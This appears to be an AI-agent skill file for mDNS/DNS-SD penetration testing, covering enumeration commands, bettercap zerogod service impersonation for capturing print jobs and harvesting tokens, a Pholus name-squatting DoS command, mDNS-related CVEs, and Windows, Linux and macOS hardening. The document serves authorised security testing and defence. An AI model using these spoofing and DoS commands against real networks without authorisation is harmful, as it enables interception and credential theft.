---
name: mdns-pentesting
description: Multicast DNS (mDNS) and DNS-SD pentesting skill. Use this whenever the user mentions mDNS, DNS-SD, service discovery, zeroconf, port 5353, .local domain, Avahi, Bonjour, AirPlay, printer spoofing, or any local network service discovery attacks. Trigger for network enumeration, service spoofing, MitM attacks, credential harvesting via mDNS, or defensive hardening of mDNS services. Make sure to use this skill for any local network reconnaissance involving service discovery protocols.
---

# mDNS/DNS-SD Pentesting

A comprehensive skill for attacking and defending Multicast DNS (mDNS) and DNS Service Discovery (DNS-SD) on local networks.

## When to Use This Skill

Use this skill when:
- Enumerating services on a local network segment
- Performing service discovery attacks
- Spoofing or impersonating local services (printers, AirPlay, HTTP, file shares)
- Conducting MitM attacks via mDNS
- Harvesting credentials through mDNS spoofing
- Hardening mDNS services defensively
- Investigating .local domain name resolution
- Working with port 5353/UDP traffic
- Dealing with Avahi, Bonjour, or Zeroconf implementations

## Protocol Overview

mDNS enables DNS-like name resolution without a unicast DNS server:
- **Port**: UDP/5353
- **Multicast addresses**: 224.0.0.251 (IPv4), FF02::FB (IPv6)
- **Zone**: .local domain
- **Service types**: _<service>._tcp or _<service>._udp.local

Common service types:
- `_ipp._tcp.local` - Printers
- `_airplay._tcp.local` - AirPlay
- `_adb._tcp.local` - Android Debug Bridge
- `_http._tcp.local` - Web services
- `_printer._tcp.local` - Generic printers
- `_services._dns-sd._udp.local` - Service type enumeration

## Network Enumeration

### Using nmap

```bash
# Direct mDNS scan on a specific host
nmap -sU -p 5353 --script=dns-service-discovery <target>

# Broadcast discovery - listen to segment and enumerate all services
sudo nmap --script=broadcast-dns-service-discovery
```

### Using avahi-browse (Linux)

```bash
# List all service types
avahi-browse -bt _services._dns-sd._udp

# Browse all services and resolve to host/port
avahi-browse -art

# Browse specific service type
avahi-browse -art _http._tcp
```

### Using dns-sd (macOS)

```bash
# Browse all HTTP services
dns-sd -B _http._tcp

# Enumerate service types
dns-sd -B _services._dns-sd._udp

# Resolve specific instance to SRV/TXT records
dns-sd -L "My Printer" _ipp._tcp local
```

### Using tshark for packet capture

```bash
# Live capture of mDNS traffic
sudo tshark -i <iface> -f "udp port 5353" -Y mdns

# Only DNS-SD service list queries
sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""

# Save to file for analysis
sudo tshark -i <iface> -f "udp port 5353" -Y mdns -w mdns_capture.pcap
```

### Using Pholus

```bash
# Passive sniff (timeout in seconds)
sudo python3 pholus3.py <iface> -stimeout 60

# Enumerate service types
sudo python3 pholus3.py <iface> -sscan

# Send generic mDNS requests
sudo python3 pholus3.py <iface> --request

# Reverse mDNS sweep of a subnet
sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
```

## Attack Techniques

### 1. Service Spoofing and Impersonation (MitM)

Use bettercap's zerogod module to impersonate advertised services:

```bash
# Start bettercap with interface
sudo bettercap -iface <iface>

# Enable mDNS/DNS-SD discovery
> zerogod.discovery on

# Show all services seen from a host
> zerogod.show 192.168.1.42

# Show full DNS records for a host
> zerogod.show-full 192.168.1.42

# Impersonate all services of a target host
> zerogod.impersonate 192.168.1.42

# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42

# Save discovered services to file
> zerogod.save 192.168.1.42 target.yml

# Advertise saved services later
> zerogod.advertise target.yml
```

**Use cases:**
- Capture documents by spoofing `_ipp._tcp` or `_printer._tcp`
- Lure clients to HTTP/HTTPS services to harvest tokens/cookies
- Combine with NTLM relay when Windows clients negotiate auth
- Intercept AirPlay streams
- Capture ADB connections

### 2. mDNS Name Probing Interference (DoS / Name Squatting)

During the probing phase, hosts check name uniqueness. Responding with spoofed conflicts forces them to pick new names or fail:

```bash
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```

This can delay or prevent service registration and discovery.

### 3. WebRTC mDNS Considerations

Modern browsers obfuscate host candidates with random mDNS names. To re-expose LAN IPs:

**Chrome/Edge policy:**
```reg
HKLM\Software\Policies\Google\Chrome
WebRtcLocalIpsAllowedUrls = <allowed URLs>
```

**Chrome flags:**
- `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns`
- Toggle to expose host candidates instead of mDNS

When users disable this protection (common in WebRTC troubleshooting), their browsers advertise plain host candidates that you can capture via mDNS or ICE signaling.

### 4. Known Vulnerabilities

**Avahi (Linux):**
- CVE-2023-38469..38473, CVE-2023-1981: Reachable-assertion and D-Bus crash bugs can terminate avahi-daemon

**Cisco IOS XE WLC:**
- CVE-2024-20303: mDNS gateway DoS - flood crafted mDNS to spike WLC CPU and drop AP tunnels

**Apple mDNSResponder:**
- CVE-2024-44183: Logic error DoS - crash Bonjour to suppress service publication/lookup
- CVE-2025-31222: Local privilege escalation via mDNSResponder (persistence on unmanaged Macs/iPhones)

## Defensive Hardening

### Windows

**Disable mDNS via registry:**
```reg
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
```
Reboot required.

**Disable firewall rule:**
- Disable "mDNS (UDP-In)" Windows Defender Firewall rule (at least on Domain profile)

**Group Policy (Windows 11+):**
- Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol
- Set to Disabled

### Linux (Avahi)

Edit `/etc/avahi/avahi-daemon.conf`:

```ini
[server]
# Lock down publishing when not needed
disable-publishing=yes

# Restrict interfaces
allow-interfaces=eth0
deny-interfaces=eth1

# Security settings
check-response-ttl=yes

# Avoid reflector unless required
enable-reflector=no

# If reflecting, use allowlists
reflect-filters=192.168.1.0/24
```

### macOS

- Restrict inbound mDNS at host/network firewalls when Bonjour discovery is not needed
- Monitor for unusual mDNS activity

### Network Segmentation

- Don't route 224.0.0.251/FF02::FB between security zones unless an mDNS gateway is explicitly required
- If bridging discovery, prefer allowlists and rate limits

### Monitoring

Alert on:
- Unusual surges in `_services._dns-sd._udp.local` queries
- Sudden changes in SRV/TXT records of critical services
- These indicate spoofing or service impersonation attempts

## Tooling Quick Reference

| Tool | Purpose | Key Commands |
|------|---------|--------------|
| nmap | Service discovery | `--script=dns-service-discovery`, `--script=broadcast-dns-service-discovery` |
| avahi-browse | Linux service browsing | `-art`, `-bt _services._dns-sd._udp` |
| dns-sd | macOS service browsing | `-B _http._tcp`, `-L "instance" _type local` |
| tshark | Packet capture | `-f "udp port 5353" -Y mdns` |
| Pholus | Active scan, DoS, spoofing | `-stimeout`, `-sscan`, `-rdns_scanning`, `-afre` |
| bettercap | Service impersonation | `zerogod.discovery`, `zerogod.impersonate`, `zerogod.save` |

## Workflow Recommendations

1. **Reconnaissance**: Start with passive enumeration using `avahi-browse -art` or `nmap --script=broadcast-dns-service-discovery`
2. **Target Selection**: Identify valuable services (printers, file shares, HTTP services)
3. **Capture**: Use tshark to capture mDNS traffic for analysis
4. **Spoofing**: Use bettercap zerogod to impersonate services
5. **Credential Harvesting**: Combine with NTLM relay for Windows environments
6. **Persistence**: Consider known vulnerabilities for long-term access

## References

- [Nmap NSE: broadcast-dns-service-discovery](https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html)
- [bettercap zerogod](https://www.bettercap.org/modules/ethernet/zerogod/)
- [Practical IoT Hacking](https://books.google.co.uk/books/about/Practical_IoT_Hacking.html?id=GbYEEAAAQBAJ)
- [Cisco IOS XE WLC mDNS DoS (CVE-2024-20303)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-wlc-mdns-dos-4hv6pBGf.html)
- [Apple mDNSResponder CVE-2024-44183](https://www.rapid7.com/db/vulnerabilities/apple-mdnsresponder-cve-2024-44183/)
- [Apple mDNSResponder CVE-2025-31222](https://www.rapid7.com/db/vulnerabilities/apple-osx-mdnsresponder-cve-2025-31222/)
